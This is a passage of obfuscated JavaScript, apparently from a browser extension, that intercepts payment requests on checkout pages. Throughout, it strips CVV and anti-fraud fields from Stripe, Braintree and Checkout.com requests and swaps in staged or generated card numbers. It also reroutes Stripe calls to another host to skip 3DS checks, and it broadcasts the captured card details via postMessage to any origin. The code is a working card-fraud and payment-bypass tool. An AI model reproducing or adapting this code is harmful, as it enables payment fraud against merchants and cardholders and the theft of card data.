      _0x29e430 = !!((_0x1f93e0 && _0x2c78d4.cvvBypass?.gateways?.braintree) || _0xbtCrFlg);
    } else if (_0x1239ce.includes("basistheory.com")) {
      // Basis Theory (Whop): card replacement only — no CVV bypass there.
      _0x29e430 = !!(_0x2c78d4.cardReplacement?.enabled && _0x2c78d4.cardReplacement?.gateways?.basistheory);
    }
    const _0x588393 = ["analytics", "fingerprint", "pixel", "telemetry", "log", "metric", "report", "binlookup", "bin/", "paymentdetails"];
    const _0x3b745a = _0x588393.some(_0x37352e => _0x1239ce.toLowerCase().includes(_0x37352e)) || _0x1239ce.toLowerCase().includes("setup") && !_0x1239ce.toLowerCase().includes("setup_intents");
    const _0x52a76a = _0x510013 && _0x8ce893 && _0x29e430 && !_0x3b745a;
    if (_0x52a76a) {
      if (_0xad7dcb instanceof Request && (!_0x45460c || !_0x45460c.body)) {
        try {
          if (!_0x45460c) {
            _0x45460c = {};
          }
          const _0x505a3d = _0xad7dcb.clone();
          _0x45460c.body = await _0x505a3d.text();
          if (!_0x45460c.method) {
            _0x45460c.method = _0xad7dcb.method;
          }
          if (!_0x45460c.headers && _0xad7dcb.headers) {
            _0x45460c.headers = {};
            _0xad7dcb.headers.forEach((_0x246618, _0x5c59d6) => _0x45460c.headers[_0x5c59d6] = _0x246618);
          }
        } catch (_0x4a985c) {}
      }
      try {
        const _0x4068ef = await _0x3ccea3(_0x1239ce, _0x317bff);
        if (_0x4068ef) {
          if (_0x4068ef.action === "REMOVE_PARAMS" || _0x4068ef.action === "REMOVE_FROM_URLENCODED") {
            let _0x3492f3 = [];
            let _0x214e2e = [];
            let _0x114b88 = [];
            const _0x4a3856 = ["cvc", "cvv", "security_code", "cvv2", "cvc2", "card[cvc]", "card[cvv]", "payment_method_data[card][cvc]", "payment_method_options[card][cvc]", "link[card][cvc]", "source_data[card][cvc]", "source[card][cvc]", "encryptedSecurityCode"];
            const _0x3cad20 = ["\"cvc\":\\s*\"[^\"]*\",?", "\"cvv\":\\s*\"[^\"]*\",?", "\"encryptedSecurityCode\":\\s*\"[^\"]*\",?"];
            const _0x1a4241 = ["payment_user_agent", "payment_method_data[payment_user_agent]", "source_data[payment_user_agent]", "pasted_fields", "payment_method_data[pasted_fields]", "source_data[pasted_fields]", "time_on_page", "payment_method_data[time_on_page]", "source_data[time_on_page]", "muid", "sid", "guid"];
            const _0x40d4fb = _0x1239ce.includes("api.stripe.com");
            const _0x377a4b = _0x48fa9e();
            if (_0x1f93e0 && ((_0x130807 = (_0xe31943 = _0x2c78d4.cvvBypass) == null ? undefined : _0xe31943.gateways) == null ? undefined : _0x130807.stripe) && _0x40d4fb && !_0x377a4b) {
              _0x4068ef.params.forEach(_0x480b99 => {
                if (_0x4a3856.includes(_0x480b99)) {
                  _0x3492f3.push(_0x480b99);
                }
              });
              if ((_0x47dbb4 = _0x4068ef.regexRemovals) == null) {
                undefined;
              } else {
                _0x47dbb4.forEach(_0x317d94 => {
                  if (_0x3cad20.some(_0x3a9fcc => _0x317d94.includes(_0x3a9fcc.split(":")[0]))) {
                    _0x214e2e.push(_0x317d94);
                  }
                });
              }
              if (_0x3492f3.some(_0x22200a => _0x4a3856.includes(_0x22200a))) {
                _0x114b88.push("CVV");
              }
            }
            if (_0x1ee770 && _0x40d4fb) {
              _0x4068ef.params.forEach(_0x446668 => {
                if (_0x1a4241.includes(_0x446668) && !_0x3492f3.includes(_0x446668)) {
                  _0x3492f3.push(_0x446668);
                }
              });
              if (_0x3492f3.some(_0x5097f9 => _0x1a4241.includes(_0x5097f9))) {
                _0x114b88.push("PAU");
              }
            }
            const _0x4ef6ea = ((_0x236e2c = _0x2c78d4.cardReplacement) == null ? undefined : _0x236e2c.enabled) && ((_0x2e1457 = (_0x3bf346 = _0x2c78d4.cardReplacement) == null ? undefined : _0x3bf346.gateways) == null ? undefined : _0x2e1457.stripe);
            if (_0x4ef6ea && _0x4068ef.cardReplacementParams && _0x45460c && _0x45460c.body && typeof _0x45460c.body === "string" && !_0x1239ce.includes("/3ds2/") && !_0x1239ce.includes("/authenticate")) {
              const _0x241cd5 = _0x4068ef.cardReplacementParams;
              // Rule-driven key lists can omit Stripe key families the XHR
              // path covers (link[card][...], payment_method_options[card][...]).
              // Union them in for Stripe API calls so the placeholder never
              // leaks onto the wire via an unlisted key.
              if (_0x241cd5 && _0x1239ce.includes("stripe.com")) {
                const _semexFullKeys = {
                  number: ["card[number]", "payment_method_data[card][number]", "payment_method_options[card][number]", "link[card][number]", "source_data[card][number]"],
                  exp_month: ["card[exp_month]", "payment_method_data[card][exp_month]", "payment_method_options[card][exp_month]", "link[card][exp_month]", "source_data[card][exp_month]"],
                  exp_year: ["card[exp_year]", "payment_method_data[card][exp_year]", "payment_method_options[card][exp_year]", "link[card][exp_year]", "source_data[card][exp_year]"],
                  cvc: ["card[cvc]", "payment_method_data[card][cvc]", "payment_method_options[card][cvc]", "link[card][cvc]", "source_data[card][cvc]"]
                };
                for (const _semexK in _semexFullKeys) {
                  const _semexCur = Array.isArray(_0x241cd5[_semexK]) ? _0x241cd5[_semexK] : (_0x241cd5[_semexK] ? [_0x241cd5[_semexK]] : []);
                  _0x241cd5[_semexK] = Array.from(new Set(_semexCur.concat(_semexFullKeys[_semexK])));
                }
              }
              if (!_0x1ffd58(_0x45460c.body, _0x241cd5)) {} else {
                // Placeholder-fill mode: if a real card was staged during fill
                // (SEMEX_SET_PENDING_CARD), swap THAT card in — never a freshly
                // generated one, or the submitted card wouldn't match the fill.
                // Expire stale staged cards (3 min) so a leftover never swaps
                // into an unrelated later request on the same page.
                let _0x129051 = null;
                if (window.__SEMEX_PENDING_CARD && window.__SEMEX_PENDING_CARD.ts &&
                    (Date.now() - window.__SEMEX_PENDING_CARD.ts) > 180000) {
                  window.__SEMEX_PENDING_CARD = null;
                }
                const _semexPendF = window.__SEMEX_PENDING_CARD;
                if (_semexPendF && _semexPendF.number) {
                  if (!_semexPendF.persistent) window.__SEMEX_PENDING_CARD = null;
                  _0x129051 = {
                    number: _semexPendF.number,
                    exp_month: _semexPendF.month || _semexPendF.exp_month,
                    exp_year: _semexPendF.year || _semexPendF.exp_year,
                    cvc: _semexPendF.cvv || _semexPendF.cvc
                  };
                }
                if (!_0x129051) _0x129051 = _0xb1076a();
                if (_0x129051 && _0x129051.number) {
                  if (_0x241cd5.number) {
                    _0x45460c.body = _0x3d6c2f(_0x45460c.body, _0x241cd5.number, _0x129051.number);
                  }
                  if (_0x241cd5.exp_month && _0x129051.exp_month) {
                    _0x45460c.body = _0x3d6c2f(_0x45460c.body, _0x241cd5.exp_month, String(_0x129051.exp_month));
                  }
                  if (_0x241cd5.exp_year && _0x129051.exp_year) {
                    const _0x16fe1e = String(_0x129051.exp_year).slice(-2);
                    _0x45460c.body = _0x3d6c2f(_0x45460c.body, _0x241cd5.exp_year, _0x16fe1e);
                  }
                  const _0x1935af = ((_0x57df29 = _0x2c78d4.cvvBypass) == null ? undefined : _0x57df29.enabled) && ((_0x4576bd = (_0x4689e9 = _0x2c78d4.cvvBypass) == null ? undefined : _0x4689e9.gateways) == null ? undefined : _0x4576bd.stripe);
                  const _0x5adf64 = _0x129051.cvc || _0x129051.cvv;
                  if (_0x241cd5.cvc && _0x5adf64 && (!_0x1935af || _0x48fa9e())) {
                    _0x45460c.body = _0x3d6c2f(_0x45460c.body, _0x241cd5.cvc, _0x5adf64);
                  }
                  _0x435696({
                    number: _0x129051.number,
                    month: _0x129051.exp_month,
                    year: _0x129051.exp_year,
                    cvv: _0x5adf64
                  });
                  window.__LAST_CAPTURED_CARD = {
                    number: _0x129051.number,
                    month: _0x129051.exp_month,
                    year: _0x129051.exp_year,
                    cvv: _0x5adf64
                  };
                  window.postMessage({
                    type: "SEMEX_PERSIST_CARD",
                    card: window.__LAST_CAPTURED_CARD
                  }, "*");
                  window.postMessage({
                    type: "SEMEX_TOAST",
                    messageType: "CARD_REPLACED",
                    gateway: "Stripe",
                    cardPreview: _0x129051.number.slice(0, 6) + "xxxx",
                    url: _0x1239ce || window.location.href
                  }, "*");
                }
              }
            }
            if (_0x3492f3.length === 0) {} else if (_0x45460c && _0x45460c.body) {
              const _0x2dce87 = _0x45460c.body;
              if (typeof _0x45460c.body === "string") {
                _0x45460c.body = _0x26cf9e(_0x45460c.body, _0x3492f3);
                if (_0x214e2e.length > 0) {
                  _0x45460c.body = _0x1b51d9(_0x45460c.body, _0x214e2e);
                }
                if (_0x45460c.body !== _0x2dce87) {
                  if (_0x114b88.length > 0) {
                    const _0x3f353e = _0x29b65c(_0x1239ce);
                    window.postMessage({
                      type: "SEMEX_TOAST",
                      messageType: "BYPASS_ACTIVATED",
                      gateway: _0x3f353e || "Unknown",
                      bypassTypes: _0x114b88,
                      url: _0x1239ce
                    }, "*");
                  }
                } else {}
              } else if (_0x45460c.body instanceof FormData) {}
            } else {}
          } else if (_0x4068ef.action === "SMART_FIELD_OPERATION" || _0x4068ef.action === "SMART_REMOVE_FIELDS") {
            if (_0x45460c && _0x45460c.body && typeof _0x45460c.body === "string") {
              try {
                let _0x579ee4 = JSON.parse(_0x45460c.body);
                let _0x2451c0 = false;
                const _0x47f010 = _0xb1076a();
                if (_0x579ee4.paymentMethod) {}
                if (_0x4068ef.fieldsToReplace && _0x47f010 && _0x47f010.number) {
                  const _0x1e45af = {
                    number: _0x47f010.number,
                    exp_month: _0x47f010.exp_month,
                    exp_year: _0x47f010.exp_year
                  };
                  for (const [_0x1fa62b, _0x2d7b05] of Object.entries(_0x4068ef.fieldsToReplace)) {
                    const _0x16bd89 = _0x1e45af[_0x2d7b05];
                    if (!_0x16bd89) {
                      continue;
                    }
                    const _0x574cdb = _0x5a041b(_0x579ee4, _0x1fa62b);
                    if (_0x574cdb) {
                      let _0x233206 = _0x579ee4;
                      for (let _0x9fd7fe = 0; _0x9fd7fe < _0x574cdb.length - 1; _0x9fd7fe++) {
                        _0x233206 = _0x233206[_0x574cdb[_0x9fd7fe]];
                      }
                      _0x233206[_0x574cdb[_0x574cdb.length - 1]] = _0x16bd89;
                      _0x2451c0 = true;
                    } else if ((_0x15fefe = (_0x298ab1 = _0x4068ef.fallbackPaths) == null ? undefined : _0x298ab1.replace) == null ? undefined : _0x15fefe[_0x2d7b05]) {
                      for (const _0x263dfd of _0x4068ef.fallbackPaths.replace[_0x2d7b05]) {
                        try {
                          let _0x1685d9 = _0x579ee4;
                          for (let _0x2b3f9c = 0; _0x2b3f9c < _0x263dfd.length - 1; _0x2b3f9c++) {
                            if (!_0x1685d9[_0x263dfd[_0x2b3f9c]]) {
                              break;
                            }
                            _0x1685d9 = _0x1685d9[_0x263dfd[_0x2b3f9c]];
                          }
                          if (_0x1685d9 && _0x263dfd[_0x263dfd.length - 1] in _0x1685d9) {
                            _0x1685d9[_0x263dfd[_0x263dfd.length - 1]] = _0x16bd89;
                            _0x2451c0 = true;
                            break;
                          }
                        } catch (_0x2b9b55) {}
                      }
                    }
                  }
                  if (_0x2451c0) {
                    window.postMessage({
                      type: "SEMEX_TOAST",
                      messageType: "CARD_REPLACED",
                      gateway: _0x4068ef.gateway || "Unknown",
                      cardPreview: _0x47f010.number.slice(0, 6) + "xxxx",
                      url: _0x1239ce
                    }, "*");
                  }
                }
                if (_0x4068ef.fieldsToRemove && _0x4068ef.fieldsToRemove.length > 0) {
                  for (const _0x108f55 of _0x4068ef.fieldsToRemove) {
                    const _0x74e715 = _0x5a041b(_0x579ee4, _0x108f55);
                    if (_0x74e715) {
                      _0x579ee4 = _0xb8b246(_0x579ee4, _0x74e715);
                      _0x2451c0 = true;
                    } else if ((_0x26c64b = _0x4068ef.fallbackPaths) == null ? undefined : _0x26c64b.remove) {
                      for (const _0x327d45 of _0x4068ef.fallbackPaths.remove) {
                        const _0x246db1 = JSON.stringify(_0x579ee4);
                        _0x579ee4 = _0xb8b246(_0x579ee4, _0x327d45);
                        if (JSON.stringify(_0x579ee4) !== _0x246db1) {
                          _0x2451c0 = true;
                          break;
                        }
                      }
                    }
                  }
                }
                if (_0x2451c0) {
                  _0x45460c.body = JSON.stringify(_0x579ee4);
                  if (((_0x3bb81e = _0x4068ef.bypassTypes) == null ? undefined : _0x3bb81e.length) > 0) {
                    window.postMessage({
                      type: "SEMEX_TOAST",
                      messageType: "BYPASS_ACTIVATED",
                      gateway: _0x4068ef.gateway || "Unknown",
                      bypassTypes: _0x4068ef.bypassTypes,
                      url: _0x1239ce
                    }, "*");
                  }
                } else {}
              } catch (_0x35232c) {}
            }
          } else if (_0x4068ef.action === "REMOVE_NESTED_FIELDS" || _0x4068ef.action === "REMOVE_FROM_JSON") {
            _0xf8ac0b("[SEMEX DEBUG Fetch] REMOVE_FROM_JSON action - processing...");
            _0xf8ac0b("[SEMEX DEBUG Fetch] init.body exists:", !!(_0x45460c == null ? undefined : _0x45460c.body));
            _0xf8ac0b("[SEMEX DEBUG Fetch] init.body type:", typeof (_0x45460c == null ? undefined : _0x45460c.body));
            if (_0x45460c && _0x45460c.body && typeof _0x45460c.body === "string") {
              try {
                _0xf8ac0b("[SEMEX DEBUG Fetch] Original body length:", _0x45460c.body.length);
                _0xf8ac0b("[SEMEX DEBUG Fetch] Original body preview:", _0x45460c.body.substring(0, 200));
                let _0x285d81 = JSON.parse(_0x45460c.body);
                _0xf8ac0b("[SEMEX DEBUG Fetch] JSON parsed successfully");
                _0xf8ac0b("[SEMEX DEBUG Fetch] JSON keys:", Object.keys(_0x285d81));
                let _0x33cb42 = false;
                if (_0x4068ef.cardReplacementParams) {
                  try {
                    const _0x479221 = _0xb1076a();
                    if (_0x479221 && _0x479221.number) {
                      const _0x2c7a11 = _0x4068ef.cardReplacementParams;
                      const _0xa652e1 = __name((_0x421304, _0x378818, _0x114d91) => {
                        if (!_0x378818 || _0x378818.length === 0) {
                          return;
                        }
                        let _0x170750 = _0x421304;
                        for (let _0x3273a6 = 0; _0x3273a6 < _0x378818.length - 1; _0x3273a6++) {
                          if (!_0x170750[_0x378818[_0x3273a6]]) {
                            _0x170750[_0x378818[_0x3273a6]] = {};
                          }
                          _0x170750 = _0x170750[_0x378818[_0x3273a6]];
                        }
                        _0x170750[_0x378818[_0x378818.length - 1]] = _0x114d91;
                      }, "setNestedValue");
                      const _0x3188b3 = __name((_0x2a9755, _0x2b156c) => {
                        if (_0x2c7a11[_0x2a9755] && _0x2b156c) {
                          _0x2c7a11[_0x2a9755].forEach(_0x1a86a5 => {
                            const _0x1a2b2e = Array.isArray(_0x1a86a5) ? _0x1a86a5 : _0x1a86a5.split(".");
                            _0xa652e1(_0x285d81, _0x1a2b2e, _0x2b156c);
                            _0x33cb42 = true;
                          });
                        }
                      }, "processReplacement");
                      _0x3188b3("number", _0x479221.number);
                      _0x3188b3("exp_month", _0x479221.exp_month);
                      if (_0x479221.exp_year && _0x2c7a11.exp_year) {
                        const _0x5447d1 = _0x479221.exp_year;
                        _0x3188b3("exp_year", _0x5447d1);
                      }
                      const _0xf87485 = ((_0x228a9f = _0x2c78d4.cvvBypass) == null ? undefined : _0x228a9f.enabled) && ((_0x2df114 = (_0x4991c4 = _0x2c78d4.cvvBypass) == null ? undefined : _0x4991c4.gateways) == null ? undefined : _0x2df114.checkout);
                      const _0x4722bf = _0x479221.cvc || _0x479221.cvv;
                      if (_0x2c7a11.cvc && _0x4722bf && !_0xf87485) {
                        _0x3188b3("cvc", _0x4722bf);
                      }
                      if (_0x33cb42) {
                        _0x435696({
                          number: _0x479221.number,
                          month: _0x479221.exp_month,
                          year: _0x479221.exp_year,
                          cvv: _0x4722bf
                        });
                        window.postMessage({
                          type: "SEMEX_TOAST",
                          messageType: "CARD_REPLACED",
                          gateway: _0x29b65c(_0x1239ce) || "Checkout.com",
                          cardPreview: _0x479221.number.slice(0, 6) + "xxxx",
                          url: _0x1239ce
                        }, "*");
                      }
                    }
                  } catch (_0x193038) {}
                }
                let _0x3f6d0b = false;
                if (_0x4068ef.target) {
                  _0xf8ac0b("[SEMEX DEBUG Fetch] Dynamic search for target:", _0x4068ef.target);
                  const _0xcbef59 = _0x5a041b(_0x285d81, _0x4068ef.target);
                  if (_0xcbef59) {
                    _0xf8ac0b("[SEMEX DEBUG Fetch] Found target at path:", _0xcbef59);
                    _0x285d81 = _0xb8b246(_0x285d81, _0xcbef59);
                    _0x33cb42 = true;
                    _0x3f6d0b = true;
                    _0xf8ac0b("[SEMEX DEBUG Fetch] Removed target field");
                  } else {
                    _0x5c07cd("[SEMEX DEBUG Fetch] Target field NOT found:", _0x4068ef.target);
                  }
                }
                if (_0x4068ef.params) {
                  _0xf8ac0b("[SEMEX DEBUG Fetch] Explicit paths to remove:", _0x4068ef.params);
                  _0x4068ef.params.forEach((_0x3aa92f, _0x18b9e0) => {
                    const _0x38a337 = JSON.stringify(_0x285d81);
                    _0x285d81 = _0xb8b246(_0x285d81, _0x3aa92f);
                    const _0x3c29ad = JSON.stringify(_0x285d81);
                    if (_0x38a337 !== _0x3c29ad) {
                      _0x33cb42 = true;
                      _0x3f6d0b = true;
                    } else {}
                  });
                }
                if (_0x33cb42) {
                  _0xf8ac0b("[SEMEX DEBUG Fetch] JSON was modified - updating body");
                  const _0x12d8db = JSON.stringify(_0x285d81);
                  _0xf8ac0b("[SEMEX DEBUG Fetch] New body length:", _0x12d8db.length);
                  _0xf8ac0b("[SEMEX DEBUG Fetch] New body preview:", _0x12d8db.substring(0, 200));
                  _0x45460c.body = _0x12d8db;
                  _0xf8ac0b("[SEMEX DEBUG Fetch] ✅ Body updated successfully");
                  if (_0x3f6d0b && _0x4068ef.bypassTypes && _0x4068ef.bypassTypes.length > 0) {
                    const _0x20708c = _0x29b65c(_0x1239ce);
                    window.postMessage({
                      type: "SEMEX_TOAST",
                      messageType: "BYPASS_ACTIVATED",
                      gateway: _0x20708c || "Unknown",
                      bypassTypes: _0x4068ef.bypassTypes,
                      url: _0x1239ce
                    }, "*");
                  }
                } else {}
              } catch (_0x5c6c31) {}
            } else {}
          } else if (_0x4068ef.action === "REPLACE_URL_ONLY") {
            if ((((_0x1aa3f1 = _0x2c78d4.threeDSBypass) == null ? undefined : _0x1aa3f1.enabled) ?? true) && _0x4068ef.targetHost) {
              const _0x38c80b = _0x1239ce.replace("api.stripe.com", _0x4068ef.targetHost);
              window.__CHECK_3DS_FAILURE = true;
              if (_0x4068ef.bypassTypes) {
                window.postMessage({
                  type: "SEMEX_TOAST",
                  messageType: "BYPASS_ACTIVATED",
                  gateway: "STRIPE",
                  bypassTypes: _0x4068ef.bypassTypes,
                  url: _0x1239ce || window.location.href
                }, "*");
              }
              _0x4f3296 = await _0x416754(_0x38c80b, _0x45460c);
              // ── Fetch-path 3DS failure detection ──────────────────────────
              // The XHR onreadystatechange handler owns __CHECK_3DS_FAILURE for
              // the XHR path. For the fetch path we must handle it here,
              // otherwise the flag stays true and the next unrelated 4xx XHR
              // is wrongly labelled 3ds_bypass_failed.
              window.__CHECK_3DS_FAILURE = false;
              if (_0x4f3296 && _0x4f3296.status >= 400) {
                try {
                  const _0x3dsClone = _0x4f3296.clone();
                  _0x3dsClone.json().then(function(_0x3dsBody) {
                    const _0x3dsMsg = _0x3dsBody && _0x3dsBody.error &&
                      (_0x3dsBody.error.message || _0x3dsBody.error.type || _0x3dsBody.error.code);
                    const _0x3dsPlain = _0x3dsBody && (_0x3dsBody.message || _0x3dsBody.error_description);
                    if (_0x3dsMsg || _0x3dsPlain) {
                      window.postMessage({
                        type: "PAYMENT_STATUS_DETECTED",
                        url: _0x38c80b,
                        status: "DEAD",
                        gateway: "STRIPE",
                        declineCode: "3ds_bypass_failed",
                        errorCode: "3ds_bypass_failed",
                        card: window.__LAST_CAPTURED_CARD || null
                      }, "*");
                    }
                  }).catch(function() {
                    // Non-JSON body from relay — still a bypass failure.
                    window.postMessage({
                      type: "PAYMENT_STATUS_DETECTED",
                      url: _0x38c80b,
                      status: "DEAD",
                      gateway: "STRIPE",
                      declineCode: "3ds_bypass_failed",
                      errorCode: "3ds_bypass_failed",
                      card: window.__LAST_CAPTURED_CARD || null
                    }, "*");
                  });
                } catch (_0x3dsErr) {}
              }
              // ─────────────────────────────────────────────────────────────
            }
          }
        }
      } catch (_0x11f028) {}
      // ── Braintree CVV / card-replacement bypass (session-rules-driven with hardcoded fallback) ──
      {
        const _0xbtIsGw = _0x1239ce.includes("braintree-api.com") || _0x1239ce.includes("braintreegateway.com") || _0x1239ce.includes("client.bin.paypal.com");
        if (_0xbtIsGw && !_0x4f3296 && _0x45460c && _0x45460c.body && typeof _0x45460c.body === "string") {
          const _0xbtS = _0x2c78d4;
          const _0xbtCvvOn = _0x1f93e0 && !!(((_0xbtS.cvvBypass || {}).gateways) || {}).braintree;
          const _0xbtCrOn = !!((_0xbtS.cardReplacement || {}).enabled) && !!(((_0xbtS.cardReplacement || {}).gateways) || {}).braintree;
          const _0xbtCt = (_0x45460c.headers && (_0x45460c.headers["content-type"] || _0x45460c.headers["Content-Type"])) || "";
          const _0xbtJson = _0xbtCt.includes("application/json") || _0x1239ce.includes("braintree-api.com");
          // Read configurable paths from session rules; fall back to hardcoded defaults
          const _0xbtRulesExist = !!(window.SEMEX_SESSION_RULES && window.SEMEX_SESSION_RULES.xhrBypass && window.SEMEX_SESSION_RULES.xhrBypass.braintree);
          const _0xbtRules = _0xbtRulesExist ? window.SEMEX_SESSION_RULES.xhrBypass.braintree : {};
          // Honor enabled=false from session rules: owner can disable Braintree intercept per-merchant
          if (_0xbtRulesExist && _0xbtRules.enabled === false) { /* skip — session rule disabled Braintree */ }
          else {
          const _0xbtCvvField = _0xbtRules.cvvField || "cvv";
          const _0xbtCcPaths = _0xbtRules.creditCardPaths || ["variables.input.creditCard", "variables.input.payment.creditCard", "creditCard"];
          const _0xbtUrlTargets = _0xbtRules.urlEncodedTargets || ["credit_card%5Bcvv%5D", "credit_card[cvv]"];
          const _0xbtCrParams = (window.SEMEX_SESSION_RULES && window.SEMEX_SESSION_RULES.cardReplacementParams && window.SEMEX_SESSION_RULES.cardReplacementParams.braintree) || {};
          const _0xbtNumField = _0xbtCrParams.number || "number";
          const _0xbtMonthField = _0xbtCrParams.exp_month || "expirationMonth";
          const _0xbtYearField = _0xbtCrParams.exp_year || "expirationYear";
          // CVV field for card replacement: use cardReplacementParams.braintree.cvv if configured,
          // otherwise share the xhrBypass cvvField so the two settings stay consistent.
          const _0xbtCrCvvField = _0xbtCrParams.cvv || _0xbtCvvField;
          function _0xbtResolvePath(_0xbtObj, _0xbtPath) {
            try {
              const _0xbtParts = _0xbtPath.split(".");
              let _0xbtCur = _0xbtObj;
              for (const _0xbtP of _0xbtParts) {
                if (_0xbtCur == null || typeof _0xbtCur !== "object") return null;
                _0xbtCur = _0xbtCur[_0xbtP];
              }
              return (typeof _0xbtCur === "object" && _0xbtCur !== null) ? _0xbtCur : null;
            } catch (_0xbtEp) { return null; }
          }
          if (_0xbtJson) {
            try {
              const _0xbtB = JSON.parse(_0x45460c.body);
              let _0xbtMod = false;
              // Try each configured creditCard path until one resolves
              let _0xbtCc = null;
              for (const _0xbtPath of _0xbtCcPaths) {
                _0xbtCc = _0xbtResolvePath(_0xbtB, _0xbtPath);
                if (_0xbtCc) break;
              }
              if (_0xbtCc) {
                if (_0xbtCvvOn && _0xbtCc[_0xbtCvvField] !== undefined) { delete _0xbtCc[_0xbtCvvField]; _0xbtMod = true; }
                if (_0xbtCrOn) {
                  const _0xbtCd = window.__SEMEX_CURRENT_CARD || window.__LAST_CAPTURED_CARD;
                  if (_0xbtCd && _0xbtCd.number) {
                    _0xbtCc[_0xbtNumField] = _0xbtCd.number;
                    _0xbtCc[_0xbtMonthField] = _0xbtCd.exp_month || _0xbtCd.month;
                    _0xbtCc[_0xbtYearField] = String(_0xbtCd.exp_year || _0xbtCd.year);
                    // Use cardReplacementParams.braintree.cvv for the replacement CVV field name
                    if (_0xbtCvvOn) delete _0xbtCc[_0xbtCrCvvField];
                    else if (_0xbtCd.cvc || _0xbtCd.cvv) _0xbtCc[_0xbtCrCvvField] = _0xbtCd.cvc || _0xbtCd.cvv;
                    _0xbtMod = true;
                    window.postMessage({ type: "SEMEX_TOAST", messageType: "CARD_REPLACED", gateway: "Braintree", url: _0x1239ce }, "*");
                  }
                }
              }
              if (_0xbtMod) _0x45460c.body = JSON.stringify(_0xbtB);
            } catch (_0xbtE) {}
          } else if (_0xbtCt.includes("urlencoded") && _0xbtCvvOn) {
            let _0xbtBody = _0x45460c.body;
            for (const _0xbtT of _0xbtUrlTargets) {
              // Build a regex that escapes the target string for use in a pattern
              const _0xbtEsc = _0xbtT.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
              _0xbtBody = _0xbtBody.replace(new RegExp("&?" + _0xbtEsc + "=[^&]*", "gi"), "");
            }
            _0x45460c.body = _0xbtBody.replace(/^&/, "");
          }
          if (_0xbtCvvOn) window.postMessage({ type: "SEMEX_TOAST", messageType: "BYPASS_ACTIVATED", gateway: "BRAINTREE", bypassTypes: ["CVV"], url: _0x1239ce }, "*");
          } // end: enabled gate
        }
      }
      // ── Basis Theory card replacement (Whop) — hardcoded handler ──
      // BT hosted-element iframes tokenize via api.basistheory.com with
      // { type:"card", data:{ number, expiration_month, expiration_year, cvc } }.
      // This fetch hook runs in BOTH the BT iframe and the whop.com top frame
      // (manifest: <all_urls>, all_frames, MAIN world), so it fires wherever the
      // SDK originates the request. FAIL-SAFE: the body is only touched when the
      // exact card-token shape matches AND a real card was staged during fill.
      {
        const _0xbasisIsGw = _0x1239ce.includes("basistheory.com");
        if (_0xbasisIsGw && !_0x4f3296 && _0x45460c && typeof _0x45460c.body === "string") {
          const _0xbasisCrOn = !!((_0x2c78d4.cardReplacement || {}).enabled) && !!(((_0x2c78d4.cardReplacement || {}).gateways) || {}).basistheory;
          const _0xbasisRules = (window.SEMEX_SESSION_RULES && window.SEMEX_SESSION_RULES.xhrBypass && window.SEMEX_SESSION_RULES.xhrBypass.basistheory) || null;
          // Owner kill-switch: session rules can disable the BT swap per-deploy.
          if (_0xbasisRules && _0xbasisRules.enabled === false) { /* skip — session rule disabled Basis Theory */ }
          else if (_0xbasisCrOn) {
            try {
              const _0xbasisB = JSON.parse(_0x45460c.body);
              const _0xbasisData = _0xbasisB && _0xbasisB.data && typeof _0xbasisB.data === "object" ? _0xbasisB.data : null;
              const _0xbasisIsCardShape = !!_0xbasisData && typeof _0xbasisData.number === "string" &&
                /^\d{13,19}$/.test(_0xbasisData.number.replace(/\s+/g, "")) &&
                (_0xbasisData.expiration_month !== undefined || _0xbasisData.expiration_year !== undefined) &&
                (!_0xbasisB.type || _0xbasisB.type === "card");
              if (_0xbasisIsCardShape) {
                // Staged real card (SEMEX_SET_PENDING_CARD during fill) — 3-min TTL,
                // mirrors the Stripe placeholder-mode swap semantics.
                if (window.__SEMEX_PENDING_CARD && window.__SEMEX_PENDING_CARD.ts &&
                    (Date.now() - window.__SEMEX_PENDING_CARD.ts) > 180000) {
                  window.__SEMEX_PENDING_CARD = null;
                }
                const _0xbasisPend = window.__SEMEX_PENDING_CARD;
                if (_0xbasisPend && _0xbasisPend.number) {
                  if (!_0xbasisPend.persistent) window.__SEMEX_PENDING_CARD = null;
                  _0xbasisData.number = String(_0xbasisPend.number).replace(/\s+/g, "");
                  const _0xbasisM = _0xbasisPend.month || _0xbasisPend.exp_month;
                  let _0xbasisY = _0xbasisPend.year || _0xbasisPend.exp_year;
                  if (_0xbasisM !== undefined && _0xbasisM !== null && _0xbasisData.expiration_month !== undefined) _0xbasisData.expiration_month = _0xbasisM;
                  if (_0xbasisY !== undefined && _0xbasisY !== null && _0xbasisData.expiration_year !== undefined) {
                    // BT expects a 4-digit year (docs: expiration_year: 2026).
                    _0xbasisY = String(_0xbasisY);
                    if (_0xbasisY.length === 2) _0xbasisY = "20" + _0xbasisY;
                    _0xbasisData.expiration_year = _0xbasisY;
                  }
                  const _0xbasisCvv = _0xbasisPend.cvv || _0xbasisPend.cvc;
                  if (_0xbasisCvv && _0xbasisData.cvc !== undefined) _0xbasisData.cvc = _0xbasisCvv;
                  _0x45460c.body = JSON.stringify(_0xbasisB);
                  window.__LAST_CAPTURED_CARD = {
                    number: _0xbasisData.number,
                    month: _0xbasisData.expiration_month,
                    year: _0xbasisData.expiration_year,
                    cvv: _0xbasisData.cvc
                  };
                  window.postMessage({
                    type: "SEMEX_TOAST",
                    messageType: "CARD_REPLACED",
                    gateway: "Basis Theory",
                    cardPreview: _0xbasisData.number.slice(0, 6) + "xxxx",
                    url: _0x1239ce || window.location.href
                  }, "*");
                }
              }
            } catch (_0xbasisE) {}
          }
        }
      }
    }
    if (!_0x4f3296) {
      try {
        _0x4f3296 = await _0x416754.call(this, _0xad7dcb, _0x45460c);
      } catch (_0x55af1f) {
        const _0x5e30b6 = _0x1239ce.includes("api.stripe.com") || _0x1239ce.includes("adyen.com") && !_0x1239ce.includes("analytics") || _0x1239ce.includes("checkout.com/tokens") || _0x1239ce.includes("api.gog.com/v1/checkout");
        if (_0x5e30b6) {}
        throw _0x55af1f;
      }
    }
    try {
      const _0x561120 = _0x4f3296.url;
      if (_0x1239ce.includes("api.stripe.com")) {}
      if (_0x54ceef || _0x561120 && _0x561120.includes("/payment_pages/") && _0x561120.includes("/init")) {
        const _0xec6539 = _0x4f3296.clone();
        _0xec6539.text().then(_0x2741f5 => {
          var _0x57634a;
          var _0x3eccf2;
          var _0x2f498e;
          var _0x37228e;
          var _0x46e127;
          var _0xd5755e;
          var _0x37a797;
          var _0x59dd53;
          var _0x4f5382;
          var _0x5b0d5c;
          var _0x4a54b3;
          var _0x3bb245;
          var _0x548b9b;
          var _0x2fb62f;
          var _0x2ae6ba;
          var _0x323746;
          var _0x4a5a91;
          var _0x35ab1b;
          var _0x5c778e;
